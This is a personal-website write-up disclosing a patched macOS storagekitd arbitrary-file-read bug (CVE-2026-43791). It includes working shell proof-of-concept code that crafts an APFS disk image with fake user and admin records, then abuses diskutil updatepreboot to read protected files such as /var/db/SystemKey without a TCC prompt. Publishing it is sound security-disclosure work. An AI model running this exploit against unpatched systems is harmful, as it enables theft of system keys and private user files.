@@ -1,0 +1,66 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="initial-scale=1"><link rel="stylesheet" href="/style.css"><link rel="icon" href="/icon.png"><title>amy's website</title></head><body><div class="top"><h1><a href="/">amy's website</a></h1><p><a href="https://github.com/asentientbot" target="_blank">github</a> / <a href="https://asentientbot.ca/@a" target="_blank">fedi</a> / <a href="mailto:asentientbot@gmail.com">email</a></p></div><div><h2>StorageKit bug 4</h2><p>There was <i>another</i> bug (like <a href="/storagekit">1</a>, <a href="/storagekit-2">2</a>, <a href="/storagekit-3">3</a>) in <code>storagekitd</code>; I reported it in April 2026, and it was fixed in <a href="https://support.apple.com/en-ca/149043" target="_blank">macOS 15.8</a>, <a href="https://support.apple.com/en-ca/149042" target="_blank">macOS 26.7</a>, and <a href="https://support.apple.com/en-ca/149035" target="_blank">macOS 27</a>:</p><pre><code>Impact: An app may be able to read arbitrary files
+Description: A validation issue was addressed with improved input sanitization.
+CVE-2026-43791: Meridian Miftari, Amy (amys.website), Aaron Grattafiori - NVIDIA AI Red Team
+</code></pre><p>Evidently, one of the other individuals found it first, so I didn't get a bounty.</p><h3>sample code</h3><p>The attack used <code>diskutil apfs updatePreboot</code> to read an arbitrary "user picture" path and write the contents to a plist.</p><pre><code>hdiutil attach -owners on theft.sparseimage
+diskutil mount theft_preboot
+
+function steal
+{
+	defaults write /Volumes/theft_system/private/var/db/dslocal/nodes/Default/users/theft.plist picture -array "$1"
+	
+	diskutil apfs updatepreboot theft_system
+	
+	plutil -extract theft.UserPictureData raw /Volumes/theft_preboot/*/var/db/AllUsersInfo.plist | base64 -d &gt; "$2"
+}
+
+# shouldn't be readable by regular users at all
+
+steal /var/db/SystemKey SystemKey.bin
+
+# should cause a TCC prompt
+
+steal ~/Downloads/zoe.png zoe.png
+
+hdiutil detach /Volumes/theft_system
+</code></pre><p>Because Open Directory is picky about permissions, creating the disk image used above requires root, but it can be done on a separate machine:</p><pre><code>hdiutil create -size 10g -layout none -o theft.sparseimage
+whole=$(hdiutil attach -plist -nomount theft.sparseimage | plutil -extract system-entities.0.dev-entry raw -)
+diskutil apfs createcontainer $whole
+container=$(diskutil info -plist $whole | plutil -extract APFSContainerReference raw -)
+diskutil apfs addvolume $container APFS theft_data -role D
+diskutil apfs addvolume $container APFS theft_system -role S -sibling theft_data
+diskutil apfs addvolume $container APFS theft_preboot -role B
+
+hdiutil detach $whole
+hdiutil attach -owners on theft.sparseimage
+
+function ensure_perms
+{
+	for volume in theft_data theft_system theft_preboot
+	do
+		sudo chown -R root:wheel /Volumes/$volume
+		sudo chmod -R 777 /Volumes/$volume
+	done
+}
+
+ensure_perms
+
+mkdir /Volumes/theft_preboot/$(diskutil info -plist theft_data | plutil -extract VolumeUUID raw -)
+
+user_plist=/Volumes/theft_system/private/var/db/dslocal/nodes/Default/users/theft.plist
+group_plist=/Volumes/theft_system/private/var/db/dslocal/nodes/Default/groups/admin.plist
+
+mkdir -p $(dirname $user_plist) $(dirname $group_plist)
+ln -s private/var /Volumes/theft_system/var
+
+defaults write $user_plist name -array theft
+defaults write $user_plist realname -array 'Amy Sidle'
+defaults write $user_plist authentication_authority -array dummy
+defaults write $user_plist generateduid -array dummy
+
+defaults write $group_plist name -array admin
+defaults write $group_plist groupmembers -array dummy
+
+ensure_perms
+
+hdiutil detach $whole
+</code></pre></div></body></html>
